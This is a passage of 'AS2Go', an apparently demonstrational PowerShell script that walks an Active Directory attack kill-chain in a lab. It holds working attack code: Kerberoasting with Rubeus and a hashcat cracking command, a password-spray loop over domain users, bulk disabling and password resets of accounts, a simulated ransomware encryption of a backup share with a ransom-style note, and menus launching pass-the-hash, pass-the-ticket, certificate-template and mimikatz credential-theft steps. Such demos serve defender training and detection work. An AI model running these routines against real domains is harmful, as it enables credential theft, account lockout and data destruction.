    Write-Highlight -Text ".\Rubeus.exe ", "kerberoast ", "/domain:", "$myDomain", " /outfile:.\", "$hashes" `
        -Color $fgcC, $fgcF, $fgcS, $fgcV, $fgcS, $fgcV

    Write-Log -Message "     >> .\$RUBEUS kerberoast /domain:$myDomain /outfile:.\$hashes"
    If ($UnAttended) {
        $answer = $No 
    }
    else {
        $question = "Do you want to run this step - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $No
    }


    If ($answer -eq $yes) {   
        #if (Test-Path $hashes) {Remove-Item $hashes}
        Invoke-Command -ScriptBlock { .\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes } | Out-Host
        Invoke-Item .\$hashes
    
        If ($UnAttended) { Start-Sleep 2 } else { Pause }
        #https://medium.com/geekculture/hashcat-cheat-sheet-511ce5dd7857
        Write-Host "`n"
        write-host "The next step is " -NoNewline; write-host "cracking" -NoNewline -ForegroundColor $fgcH 
        Write-host " the roasted hashes. HASHCAT is a good tool." 
        Write-host "Let’s use the example where you know the password policy for the password;" 
        Write-host "Known as Brute-force or mask attack."
        Write-Host "The cracking mode for TGS-REP hashes is 13100.`n"
        
        # example: .\hashcat.exe -a 3 -m 13000 ./SANDBOX.CORP.hashes.txt ?u?l?l?l?l?l?d?d
        Write-Host      -NoNewline "  Example: "
        Write-Highlight -Text ".\hashcat.exe ", "-a ", "3", " -m ", "13000 ", "./$hashes ", "?u?l?l?l?l?l?d?d" `
            -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcV, $fgcF
        Write-Host "`n"
        If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

Function Start-PasswordSprayAttack {

    Param([string] $Domain, [string] $Password, [string] $SearchBase, [string] $NoR)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"

    
    [int]$i = Get-KeyValue -key "LastNumofDemoUsers"

    If ($DeveloperMode) {
        $ADUSers = Get-ADUser -Filter * -SearchBase $SearchBase | Sort-Object { Get-Random } | Select-Object -First 100
    }
    else {
        $ADUSers = Get-Aduser -filter * -SearchBase $SearchBase | Select-Object -First $i
    }

    $Step = 0
    $TotalSteps = $ADUsers.Count
    $specChar = [char]0x00BB
        
    Foreach ($ADUSer in $ADUsers) {
        $Step += 1
        $user = $Domain + "\" + $ADUSer.samaccountname
        $progress = [int] (($Step) / $TotalSteps * 100)
        Write-Progress -Id 0 -Activity "Run Password Spray # $NoR against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
        #Set-ProgressBar -Step $Step -User $user -TotalSteps $TotalSteps
        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry("", $user, $Password)
           
              
           
        if ($null -ne $Domain_check.name) {
            Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor $fgcH -NoNewline
            Write-Host " with Password: " -NoNewline; Write-Host $Password -ForegroundColor $fgcH
        }
    }

    # close the process bar
    Start-Sleep 1
    Write-Progress -Activity "Run Password Spray # $NoR against user $User" -Status "Ready" -Completed
        
        


    #####
    Write-Log -Message "### End Function $myfunction ###"

}

function Start-UserManipulation {

    Param([string]$SearchBase)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    
    $attributes = @("sAMAccountName", "Enabled", "Modified", "PasswordLastset", "userPrincipalName", "name")
    Get-ADUser -Filter * -SearchBase $Searchbase  -Properties $attributes | Sort-Object { Get-Random } | Select-Object $attributes |  Select-Object -First 15 | Format-Table | Out-Host

    $count = (Get-ADUser -filter * -SearchBase $SearchBase).count
    $NoUsers = Get-KeyValue -key "LastNumofDemoUsers"
    
    
    Write-Host "`nFound "-NoNewline
    Write-Host $count -NoNewline -ForegroundColor Yellow
    Write-Host " AD (Demo) Users and 15 random Users listed above!"
    Write-Host "How many Users do you like to manipulate? By the last time, it was: " -NoNewline
    Write-Host $NoUsers -ForegroundColor Yellow
        
    Do {
        
        $NoUsers = Get-KeyValue -key "LastNumofDemoUsers"

        If ($UnAttended) {
            $prompt = $yes
        }
        else {
            $question = "Is the number still $NoUsers ok? - Y or N? Default "
            $prompt = Get-Answer -question $question -defaultValue $yes
        }

        if ($prompt -ne $yes) {
            $NoUsers = Read-Host "Enter a new number: "
            Set-KeyValue -key "LastNumofDemoUsers" -NewValue $NoUsers
        }
   
    } Until ($prompt -eq $yes)
    
    
    # If ($UnAttended) { Start-Sleep 2 } else { Pause }
    
      
    
    
    Clear-Host
    Write-Host "____________________________________________________________________`n" 
    Write-Host "               Try to disable all (DEMO) users                            "
    Write-Host "____________________________________________________________________`n" 
    Write-Host ""
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "get-aduser ", "-filter * ", "-SearchBase ", """$MySearchBase""", "| Disable-ADAccount"  `
        -Color $fgcC, $fgcS, $fgcS, $fgcV, $fgcC
    Write-Host ""


    $count = Get-KeyValue -key "LastNumofDemoUsers"

    If ($UnAttended) {
        $answer = $yes      
    }
    else {
        $question = "Do you want to disable $count users  - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $Yes
    }

    If ($answer -eq $yes) {
        $MyDomain = $env:USERDNSDOMAIN
        $identifier = Disable-AS2GoUser -Domain $MyDomain -SearchBase $MySearchBase -NoU $count
        If ($UnAttended) { Start-Sleep 2 } else { Pause }
    }

    Clear-Host

    Write-Host "____________________________________________________________________`n" 
    Write-Host "        Try to reset all users password                             "
    Write-Host "____________________________________________________________________`n" 
    Write-Host ""
    
    $newRandomPW = Get-RandomPassword
    
    Write-Host      -NoNewline "  Command: "
    Write-Highlight -Text "Get-aduser | Set-ADAccountPassword", " -Reset -NewPassword ", "$newRandomPW"  `
        -Color $fgcC, $fgcS, $fgcV
    Write-Host ""

    If ($UnAttended) {
        $answer = $yes  
    }
    else {
        $question = "Do you also want to reset the user's password with the random password '$newRandomPW' - Y or N? Default "
        $answer = Get-Answer -question $question -defaultValue $Yes
    }

    If ($answer -eq $yes) {
        $MyDomain = $env:USERDNSDOMAIN
        Reset-AS2GoPassword -Domain $MyDomain -NewPassword $newRandomPW -SearchBase $MySearchBase -NoR 4 -Identifier $identifier 
    }

    #CleanUp
    Get-aduser -filter * -SearchBase $MySearchBase | Enable-ADAccount

    #####
    Write-Log -Message "### End Function $myfunction ###"
}


function New-RansomareAttack {

    Param([string]$BackupShare)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    #prepare the simulation
    $path = Get-Location
    $filePrefix = "RW-" + (Get-Date).toString("yyyyMMdd_HHmmss")

    #create temp directory and fill the directory
    $FolderToEncrypt = "$BackupShare\$env:USERNAME"
    New-Item -Path $FolderToEncrypt -ItemType Directory  -ErrorAction Ignore

    If ((Test-Path -Path $FolderToEncrypt -PathType Any -ErrorAction Ignore) -eq $false) {
        Write-Host ""
        Write-Warning "Unable to create Folder - $FolderToEncrypt`n"
        Write-Host "Exit function"
        Write-Log -Message "### Exit Function $myfunction ###"
        return
    }

    Copy-Item "$path\*.*" -Destination $FolderToEncrypt -Exclude *.exe, *.ps1, .vs*


    # create info for the victim
    $newFile = "$path\$filePrefix.txt"
    (Get-Date).toString("yyyy:MM:dd HH:mm:ss") + "  | Hi $env:USERNAME, by the next time, I'll encrypt also your Active Dictory Backup files."  | Out-File -FilePath $newFile 
    Get-Item $FolderToEncrypt\*.* | Out-File -FilePath $newFile -Append
    Copy-Item -Path ".\$filePrefix.txt" -Destination $FolderToEncrypt -Recurse
    Invoke-Item "$FolderToEncrypt\$filePrefix.txt"
    Write-Host "`n Content from file $FolderToEncrypt\$filePrefix.txt before encryption"


    $question = "Do you REALLY want to run this step - Y or N? Default "
    $answer = Get-Answer -question $question -defaultValue $no

    If ($answer -eq $yes) {
    
        Write-Host "`n"
        Write-Host "WARNING: Starting to encrypt all files in folder " -NoNewline; Write-Host $FolderToEncrypt -ForegroundColor yellow
        Write-Host "`n"
        pause
    
        Get-FileVersion -filename "AS2Go-Encryption.ps1"
        .\AS2Go-Encryption.ps1 -share $FolderToEncrypt
    
        Write-host "`nAmong others, the following file has been encrypted" -ForegroundColor $global:FGCHighLight | Out-Host
        Write-host "`  --> $FolderToEncrypt\$filePrefix.txt" -ForegroundColor $global:FGCHighLight | Out-Host
        Invoke-Item "$FolderToEncrypt\$filePrefix.txt"   
    }
     #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"
}

function Stop-AS2GoDemo {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $False)]
        [string]
        $NextStepReboot = $no
    )

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####

    Clear-Host

    $closing = "DONE!"
    Write-Host $closing -ForegroundColor $global:FGCCommand
    Write-Log -Message "$closing`n`n"
    Update-WindowTitle -NewTitle $closing

    $StartDate = Get-KeyValue -key "LastStart" 
    $EndDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
    $duration = NEW-TIMESPAN –Start $StartDate –End $EndDate
    Write-host "finished after $duration [h]"

    Set-KeyValue -key "LastStage" -NewValue $stage50
    Set-KeyValue -key "LastFinished" -NewValue  $enddate
    Set-KeyValue -key "LastDuration" -NewValue "$duration [h]"

    Write-Log -Message "Start Time: $StartDate"
    Write-Log -Message "End Time  : $EndDate"
    Write-Log -Message "Total Time: $duration"

    # clean-up AS2Go Folder
    New-Item -Path ".\Clean-up" -ItemType Directory  -ErrorAction Ignore | Out-Null
    try {
        Get-ChildItem ??-*.* | Move-Item -Destination ".\Clean-up" -Force | Out-Null
    }
    catch {
    }

    Invoke-Item $scriptLog
    Invoke-Item .\step_020.html

    If ($NextStepReboot -ne $yes) {
        exit
    }

    #####
    Write-Log -Message "### End Function $myfunction ###"
}

Function Show-Step {

    Param([string]$step)

    If ($SkipImages -ne $true) { Invoke-Item ".\$step" }
    
}

function Update-WindowTitle {

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [string]
        $NewTitle)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #####
    $host.ui.RawUI.WindowTitle = $NewTitle
    Write-Log -Message "    change title to $NewTitle"
    #####
    Write-Log -Message "### End Function $myfunction ###"
}

function Write-Highlight {

    ################################################################################
    #####                                                                      ##### 
    #####    Description                ######                                 
    #####                                                                      #####
    ################################################################################


    Param ([String[]]$Text, [ConsoleColor[]]$Color, [Switch]$NoNewline = $false)

    $myfunction = Get-FunctionName
    Write-Log -Message "### Start Function $myfunction ###"
    #region ################## main code | out- host #####################

    For ([int]$i = 0; $i -lt $Text.Length; $i++) { Write-Host $Text[$i] -Foreground $Color[$i] -NoNewLine | Out-Host }
    If ($NoNewline -eq $false) { Write-Host '' | out-host }


    Write-Log -Message "    >> using $Text"
    #endregion ####################### main code #########################
    Write-Log -Message "### End Function $myfunction ###"
}

Function Write-Log {
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $False)]
        [ValidateSet("INFO", "WARN", "ERROR", "FATAL", "DEBUG")]
        [String]
        $Level = "INFO",

        [Parameter(Mandatory = $True)]
        [string]
        $Message,

        [Parameter(Mandatory = $False)]
        [string]
        $logfile = $scriptLog
    )

    If($EnableLogging -ne $true){return}

    $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
    $Line = "$Stamp $Level $Message"
    If ($logfile) {
        Add-Content $logfile -Value $Line
    }
    Else {
        Write-Output $Line
    }
}


#endregion AS2GO Functions

################################################################################
######                                                                     #####
##Go##                         START the Script                            #####
######                                                                     #####
################################################################################

Function Start-AS2GoDemo {

    Write-Log -Message "."
    Write-Log -Message "."
    Write-Log -Message "##################################################################"
    Write-Log -Message "#                                                                #"
    Write-Log -Message "           Starting Script $scriptName - Version $version "
    Write-Log -Message "#                                                                #"
    Write-Log -Message "##################################################################"
    Write-Log -Message "."
    Write-Log -Message "."
    Write-Log -Message "Victim PC run on Windows $WinVersion"


    # clean-up AS2Go Folder
    New-Item -Path ".\Clean-up" -ItemType Directory  -ErrorAction Ignore | Out-Null
    try {
        Get-ChildItem ??-*.* | Move-Item -Destination ".\Clean-up" -Force | Out-Null
    }
    catch {
    }
    
    $GroupDA = Get-ADGroupNameBasedOnRID -RID "-512"
    $GroupEA = Get-ADGroupNameBasedOnRID -RID "-519"
    $GroupSA = Get-ADGroupNameBasedOnRID -RID "-518"
    $GroupPU = Get-ADGroupNameBasedOnRID -RID "-525"
    $GroupGPO = Get-ADGroupNameBasedOnRID -RID "-520"

    # check the correct directory and requirements
    $FileVersionA = Get-FileVersion -filename "AS2Go.xml"
    $FileVersionM = Get-FileVersion -filename "mimikatz.exe"
    $FileVersionP = Get-FileVersion -filename "PsExec.exe"
    $FileVersionR = Get-FileVersion -filename "Rubeus.exe"
    $FileVersionN = Get-FileVersion -filename "NetSess.exe"
    $FileVersionC = Get-FileVersion -filename "Certify.exe"
    $FileVersionO = Get-FileVersion -filename "..\..\Program Files\OpenSSL-Win64\bin\openssl.exe"

    Confirm-PoSHModuleAvailabliy -PSModule "ActiveDirectory"
    Import-Module ActiveDirectory

    $demo = Get-KeyValue -key "DemoTitle"
    Update-WindowTitle -NewTitle $demo

    # Clear-Host
    Set-NewColorSchema -NewStage $PtT

    $laststage = Get-KeyValue -key "LastStage"

    If ($laststage -eq $stage50) {
        $StartValue = $yes
    } 
    else {
        $StartValue = $no
    } 


    If ($UnAttended) {
        if ($Continue) { $Begin = $no } else { $Begin = $yes }
    }
    else {
        if ($Continue) { $Begin = $no } 
        $question = "Starts the attack scenario from the beginning? Default "
        $Begin = Get-Answer -question $question -defaultValue $StartValue
    }



    If ($Begin -eq $yes) {
        Set-KeyValue -key "LastStage" -NewValue $stage50
        Set-NewColorSchema -NewStage $InitialStart


        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "        AS2Go.ps1   Version $version              "
        Write-Host "                                                                    "
        Write-Host "        Attack scenario to GO | along the kill-chain                " -ForegroundColor yellow
        Write-Host "                                                                    "
        Write-Host "        created by Holger Zimmermann | last update $lastupdate      "
        Write-Host "                                                                    "
        Write-Host "        Used tools & requirements:                                  "
        Write-Host "                                                                    "
        Write-Host "        ●  ACTIVE DIRECTORY PoSH module                             "
        Write-Host "                                                                    "
        Write-Host "        ●  NetSess.exe    $FileVersionN                             "
        Write-Host "        ●  Mimikatz.exe   $FileVersionM                             "
        Write-Host "                                                                    "
        Write-Host "        ●  Rubeus.exe     $FileVersionR                             "
        Write-Host "        ●  Certify.exe    $FileVersionC                             "
        Write-Host "        ●  OpenSSL.exe    $FileVersionO                             "
        Write-Host "                                                                    "
        Write-Host "        ●  PsExec.exe     $FileVersionP                             "
        Write-Host "____________________________________________________________________`n" 

        $TimeStamp = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
        $lastVictim = Get-KeyValue -key "LastVictim"
        $lastRun = Get-KeyValue -key "LastStart" 
        $lastDuration = Get-KeyValue -key "LastDuration" 

        Write-Host "`n  Current Date & Time: $TimeStamp" 
        Write-Host ""
        Write-Host "  Last Run:            " -NoNewline
        Write-Host $lastRun                -NoNewline -ForegroundColor $global:FGCHighLight
        Write-Host " | "                   -NoNewline
        Write-Host $lastDuration           -NoNewline -ForegroundColor $global:FGCHighLight
        Write-Host " | Last Victim: "      -NoNewline  
        Write-Host "[$lastVictim]"         -ForegroundColor $global:FGCHighLight
        Write-Host "`n"
        #Update AS2Go.xml config file
        Set-KeyValue -key "LastStart" -NewValue $TimeStamp


        If ($DeveloperMode) {
  
            [bool]$showStep = $false
            [bool]$skipstep = $True
            Write-Host  -ForegroundColor DarkRed "`n                    FYI: Running AS2Go in Developer Mode"
            #Write-Warning "    Running AS2Go in Developer Mode!"
            Write-Host ""
            Write-Log -Message "Running AS2Go in Developer Mode"
            $fqdn = Get-KeyValue -key "fqdn"
            
            New-PrivilegeEscalationRecommendation -computer $env:COMPUTERNAME
            #New-PrivilegeEscalationRecommendation -computer "WIN11"
            # New-PrivilegeEscalationRecommendation -computer "WIN10-1609"
            Exit
        }


        If ($UnAttended -eq $false) { pause }

        ################################################################################
        ######                                                                     #####
        ######                Setting update                                       #####
        ######                                                                     #####
        ################################################################################

        Clear-Host
        If ($UnAttended -eq $false) { Get-AS2GoSettings }

        ################################################################################
        ######                                                                     #####
        ######                Attack Level -  Bruce Force Account                  #####
        ######                                                                     #####
        ################################################################################

        #region Attack Level -  Bruce Force Account 

        If ($SkipPasswordSpray ) {
            Write-Log -Message "Skipped Attack Level - Bruce Force Account"
        }
        else {

            Clear-Host
            Update-WindowTitle -NewTitle $stage05
            #Set-KeyValue -key "LastStage" -NewValue $stage05
    
            If ($showStep) { Show-Step -step "step_004.html" }
            Do {
                # If ($skipstep) { break }            
                
                Clear-Host
                Write-Host "____________________________________________________________________`n" 
                Write-Host "                   Attack Level - Bruce Force Account                    "
                Write-Host "           ... in this case, we run a Password Spray Attack ...         "
                Write-Host "____________________________________________________________________`n" 
    
    
                if ($UnAttended -eq $true) {
                    If ($SkipPasswordSpray -eq $false)
                    { $answer = $yes }
                    else
                    { $answer = $no }
    
                }
                else {
                    $question = "Do you want to run this step - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $No
                }
    
                If ($answer -eq $yes) {
                    New-PasswordSprayAttack
                }
                elseIf ($answer -eq $exit) {
                    Stop-AS2GoDemo
                }
                else {
                }
    
    
    
                Clear-Host
    
                Write-Host "____________________________________________________________________`n" 
                Write-Host "        ??? REPEAT | Attack Level - Bruce Force Account  ???             "
                Write-Host "____________________________________________________________________`n" 
    
                If ($UnAttended) {
                    $repeat = $no
                }
                else {
                    $question = "Do you need to update more settings - Y or N? Default "
                    $repeat = Get-Answer -question $question -defaultValue $no
                }
       
            } Until ($repeat -eq $no)
        }


    }
    else {
        $PrivledgeAccount = $yes
        Set-NewColorSchema -NewStage $PtH
        #read values from AS2Go.xml config file
    }

    #read values from AS2Go.xml config file
    $myDC = Get-KeyValue -key "myDC" 
    $mySAW = Get-KeyValue -key "mySAW" 
    $myViPC = Get-KeyValue -key "myViPC"
    $fqdn = Get-KeyValue -key "fqdn"
    $pthntml = Get-KeyValue -key "pthntml"
    $krbtgtntml = Get-KeyValue -key "krbtgtntml"
    $OpenSSL = Get-KeyValue -key "OpenSSL"
    $globalHelpDesk = Get-KeyValue -key "globalHelpDesk"
    $ticketsUNCPath = Get-KeyValue -key "ticketsPath"
    $ticketsDir = Get-KeyValue -key "ticketsDir"
    $time2reboot = Get-KeyValue -key "time2reboot"
    $BDUsersOU = Get-KeyValue -key "BDUsersOU"
    $MySearchBase = Get-KeyValue -key "MySearchBase"
    $OfflineDITFile = Get-KeyValue -key "OfflineDITFile"
    $myAppServer = Get-KeyValue -key "myAppServer"
    $UseCase = Get-KeyValue -key "usecase"

    Clear-Host

    If ($Begin -eq $yes) {
        $MyInfo = "          Today I use these three (3) user accounts                    "
        $MyFGC = $global:FGCHighLight
    }
    else {
        $MyInfo = "          Still using these three (3) user accounts                    "
        $MyFGC = "Darkblue"

        If ($DeveloperMode) {
  
            [bool]$showStep = $false
            [bool]$skipstep = $True
            Write-Host ""
            Write-Warning "    Running AS2Go in Developer Mode!`n"
            Write-Log -Message "Running AS2Go in Developer Mode"
        }

    }


    Update-WindowTitle -NewTitle "Used Accounts"

    Write-Host "____________________________________________________________________`n" 
    Write-Host $MyInfo
    Write-Host "____________________________________________________________________`n" 

    $victim = $env:UserName
    $suffix = $victim.Substring(3)



    If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
        $question = " -> Enter or confirm your account suffix! Default "
        $suffix = Get-Answer -question $question -defaultValue $suffix
    }


    #Clear-Host
    $victim = "VI-$suffix"
    $helpdeskuser = "HD-$suffix"
    $domainadmin = "DA-$suffix"


    Write-Host ""
    Write-Host "  Compromised Account  --  " -NoNewline
    Write-Host                                  $victim -ForegroundColor $fgcC       
    Write-Host "  Helpdesk User        --  $helpdeskuser"
    Write-Host "  Domain Admin         --  $domainadmin"

    If ($Begin -eq $yes) {
               
        $infoV = Get-ComputerInformation -computer $myViPC
        $infoS = Get-ComputerInformation -computer $mySAW
        $infoD = Get-ComputerInformation -computer $myDC
        
        Write-Host ""
        Write-Host "  Victim Maschine      --  $infoV"
        Write-Host "  Admin Maschine       --  $infoS" 
        Write-Host "  Domain Controller    --  $infoD" 
   
        try {
            Write-Output $helpdeskuser | Set-Clipboard
        }
        catch {
            Write-Output $helpdeskuser | clip
        }
        
        If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
            $wshell = New-Object -ComObject Wscript.Shell
            $Output = $wshell.Popup("Do NOT forget to simulate helpdesk support by ""$helpdeskuser"" on your Victim PC!", 0, "Simulate helpdesk support on Victim PC - hd.cmd", 0 + 64)
        }

    }
    else {
        If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
            $wshell = New-Object -ComObject Wscript.Shell
            $Output = $wshell.Popup("Do NOT forget to simulate domain activities by ""$domainadmin"" on your Admin PC!", 0, "Simulate domain activities on Admin PC", 0 + 64)           
        }

    }

    Write-Host ""
    Set-KeyValue -key "LastVictim" -NewValue $victim


    If (($UnAttended -ne $true) -and ($SkipPopup -ne $true)) {
        Start-Sleep 2
    }
    else {
        Pause
    }



    # only for PosH Script testing hozi MyDebugHelp
    If ($DeveloperMode) {
        # function to test 
        #Restart-VictimMachines
        Write-host "START Run directy" -ForegroundColor Red


        #Restart-VictimMachines

       
        #write-host $mydebug

        #Invoke-Command -ScriptBlock {.\certify.exe find /vulnerable}
        Write-host "END Run directy" -ForegroundColor Red
        Write-Log -Message "Running dedicated function from Developer Mode section"
        pause

    }


    #endregion Attack Level -  Bruce Force Account 

    ################################################################################
    ######                                                                     #####
    ######                Attack Level - COMPROMISED User Account              #####
    ######                                                                     #####
    ################################################################################

    #region Attack Level - COMPROMISED User Account

    Update-WindowTitle -NewTitle $stage00
    #Set-KeyValue -key "LastStage" -NewValue $stage10
    If ($showStep) { Show-Step -step "step_000.html" }

    Do {

        If ($SkipCompromisedAccount) { break }    
  

        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "            Attack Level - COMPROMISED User Account                 "
        Write-Host "                Was this a PRIVLEDGE(!) Account?                    "
        Write-Host "____________________________________________________________________`n" 


        If ($UnAttended) {
            $answer = $PrivledgeAccount
        }
        else {
            $question = " -> Enter [Y] to confirm or [N] for a non-sensitive user! Default "
            $answer = Get-Answer -question $question -defaultValue $PrivledgeAccount
        }


        If ($answer -eq $yes) {
            Write-Log -Message "Starting with a PRIVLEDGE(!) COMPROMISED User Account"
            $UserPic = "step_008.html"
            $Account = "PRIVLEDGE(!) Compromised "
            $PrivledgeAccount = $yes
            $PrivilegeEscalation = $PtT
            $reconnaissance = $yes
            Set-NewColorSchema -NewStage $PtH
            #Color Schema for the next command
            #$fgcS = "Black" # Switch
            #$fgcC = "Darkblue"   # Command
            #$fgcF = "Black"
            #$fgcV = "DarkMagenta" # Value
            #$fgcH = "Darkblue" 
        }
        else {
    
            Write-Log -Message "Starting with a non-sensitive COMPROMISED User Account"
            $UserPic = "step_005.html"
            $Account = "non-sensitive Compromised"
            $PrivledgeAccount = $no
            $PrivilegeEscalation = $PtH
            $reconnaissance = $no
            Set-NewColorSchema -NewStage $InitialStart
        }

        #Pause
        If ($showStep) { Show-Step -step $UserPic }
        Start-NetSess -server $myDC

        Clear-Host
        Write-Host "____________________________________________________________________`n" 
        Write-Host "        Starting with $Account User Account        "
        Write-Host "____________________________________________________________________`n" 

        $currentUser = $victim
        $currentUser = $env:UserName

        Write-Host -NoNewline "  Command: "
        Write-Highlight -Text ("Get-ADUser ", "-Identity ", "$currentUser") -Color $fgcC, $fgcS, $fgcV

        If ($UnAttended) {
            If ($UseRUBEUS) { $answer = $yes }else { $answer = $no }
        }
        else {
            $question = "Do you want to run this step - Y or N? Default "
            $answer = Get-Answer -question $question -defaultValue $Yes
        }

        If ($answer -eq $yes) {
            Write-Host "`n`n"
            $error.Clear()
            Try {
                $attributes = @("AccountExpirationDate", "CannotChangePassword", "CanonicalName", "cn", "Created", "Department", "Description", "DisplayName", "EmployeeNumber", "Enabled", "Country", "l", "Manager", "MemberOf", "MobilePhone", "userAccountControl", "UserPrincipalName", "LastBadPasswordAttempt", "title")
                get-aduser -Identity $currentUser -Properties $attributes -ErrorAction Stop
  
            }
            catch {
                $message = $_
                Write-Host " "$message.CategoryInfo.Reason:" " -NoNewline
                $message.Exception
  
                Write-Host ""
                Write-host "  Account restrictions are preventing this user from signing in." -ForegroundColor $fgcH
                Write-HosT "  Probably helpdesk user '$helpdeskuser' is member of the 'Protected Users' Group!`n`n" -ForegroundColor $fgcH
                pause
                #Stop-AS2GoDemo
            }
    


    
            Write-Host ""
            Pause
            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "        Displays a list of currently cached Kerberos tickets        "
            Write-Host "____________________________________________________________________`n" 
            Write-Host ""             
            Write-Host -NoNewline "  Command: "
            Write-Highlight -Text ('klist') -Color $fgcC
            Write-Host ""           
            If ($UnAttended) { Start-Sleep 1 } else { Pause }
            Write-Host ""
            klist
            If ($UnAttended) { Start-Sleep 1 } else { Pause }
            Clear-Host
        }
        elseIf ($answer -eq $exit) {
            Stop-AS2GoDemo
        }
        else {
        }

        # If ($skipstep) {break}

        Write-Host "____________________________________________________________________`n" 
        Write-Host "      ??? REPEAT | Attack Level - COMPROMISED User Account ???      "
        Write-Host "____________________________________________________________________`n" 

       

        If ($UnAttended) {
            $repeat = $no
        }
        else {
            $question = "Do you need to update more settings - Y or N? Default "
            $repeat = Get-Answer -question $question -defaultValue $no
        }
   
    } Until ($repeat -eq $no)



    #endregion Attack Level - COMPROMISED User Account

    ################################################################################
    ######                                                                     #####
    ######                Attack Level - RECONNAISSANCE                        #####
    ######                                                                     #####
    ################################################################################

    #region Attack Level - RECONNAISSANCE
    If ($SkipReconnaissance) {
        Write-Log -Message "Skipped Attack Level - RECONNAISSANCE"
    }
    else {
    
        Update-WindowTitle -NewTitle $stage10
        #Set-KeyValue -key "LastStage" -NewValue $stage10
        If ($showStep) { Show-Step -step "step_006.html" }
        Do {
            # If ($skipstep) { break }     
            Clear-Host
            Write-Host "____________________________________________________________________`n" 
            Write-Host "                   Attack Level - RECONNAISSANCE                    "
            Write-Host "       try to collect reconnaissance and configuration data         "
            Write-Host "____________________________________________________________________`n" 
    
            If ($UnAttended) {
                $answer = $yes
            }
            else {
                $question = "Do you want to run this step - Y or N? Default "
                $answer = Get-Answer -question $question -defaultValue $Yes
            }
    
            If ($answer -eq $yes) {
        
                Start-Reconnaissance
    
    
                If ($UnAttended) {
                    $answer = $reconnaissance
                }
                else {
                    $question = "Further reconnaissance tasks - Y or N? Default "
                    $answer = Get-Answer -question $question -defaultValue $reconnaissance
                }
    
                If ($answer -eq $yes) {
                    Start-ReconnaissanceExtended
                }
            }
            elseIf ($answer -eq $exit) {
                Stop-AS2GoDemo
            }
            else {
            }
    
    
            Clear-Host
    
            Write-Host "____________________________________________________________________`n" 
            Write-Host "        ??? REPEAT | Attack Level - RECONNAISSANCE  ???             "
            Write-Host "____________________________________________________________________`n" 
    
            If ($UnAttended) {
                $repeat = $no
            }
            else {
                $question = "Do you need to REPEAT this attack level - Y or N? Default "
                $repeat = Get-Answer -question $question -defaultValue $no
            }
    
       
        } Until ($repeat -eq $no)   
    }



    #endregion Attack Level RECONNAISSANCE

    ################################################################################
    ######                                                                     #####
    ######                Attack Level - Privilege Escalation                      #####
    ######                                                                     #####
    ################################################################################

    #https://www.beyondtrust.com/blog/entry/privilege-escalation-attack-defense-explained
    #https://www.microsoft.com/en-us/security/blog/2019/05/09/detecting-credential-theft-through-memory-access-modelling-with-microsoft-defender-atp/


    #region Attack Level - Privilege Escalation

    If ($SkipPrivilegeEscalation) {
        Write-Log -Message "Skipped Privilege Escalation"
    }
    else {
        Update-WindowTitle -NewTitle $stage20
        Set-KeyValue -key "LastStage" -NewValue $stage20
        If ($showStep) { Show-Step -step "step_007.html" }

        Do {
            # If ($skipstep) { break }     
            Clear-Host
            Set-NewColorSchema -NewStage $InitialStart
            $PrivilegeEscalation = New-PrivilegeEscalationRecommendation -computer $env:COMPUTERNAME

            Write-Host "____________________________________________________________________`n" 
            Write-Host "       Privilege Escalation - choose your attack                             "
            Write-Host "____________________________________________________________________`n" 
            Write-Host "     - for a Pass-the-Hash Attack enter:                                 " -NoNewline; Write-Host "H"-ForegroundColor Yellow
            Write-Host "     - for a Pass-the-Ticket Attack enter:                               " -NoNewline; Write-Host "T"-ForegroundColor Yellow
            Write-Host "     - for a Kerberoasting Attack enter:                                 " -NoNewline; Write-Host "K"-ForegroundColor Yellow
            Write-Host "     - for a for Misconfigured Certificate Template Attack (ESC1) enter: " -NoNewline; Write-Host "C"-ForegroundColor Yellow
            Write-Host "     - for a PsExec Attack, eg. to System account enter  :               " -NoNewline; Write-Host "X"-ForegroundColor Yellow
            Write-Host "     - for a Credential Theft through Memory Access enter:               " -NoNewline; Write-Host "M"-ForegroundColor Yellow
            Write-Host "     - to enable the Memory Access enter:                                " -NoNewline; Write-Host "E"-ForegroundColor Yellow


            If ($UnAttended) {
                $answer = $PrivilegeEscalation
            }
            else {
                $question = "Enter your choice or enter [S] to skip this Step! Default "
                $answer = Get-Answer -question $question -defaultValue $PrivilegeEscalation
            }

            If ($answer -eq $PtH) {
                #Starting Pass-the-Hash (PtH) Attack on VictimPC
                If ($showStep) { Show-Step -step step_007_PtH.html }  
                Start-PtHAttack
            }
            elseif ($answer -eq $PtT) {
                If ($showStep) { Show-Step -step step_007_PtT.html } 
                Start-PtTAttack
            }
            elseif ($answer -eq $PtC ) {
                If ($showStep) { Show-Step -step step_007_PtT.html } 
                New-AuthenticationCertificatesAttack
            }
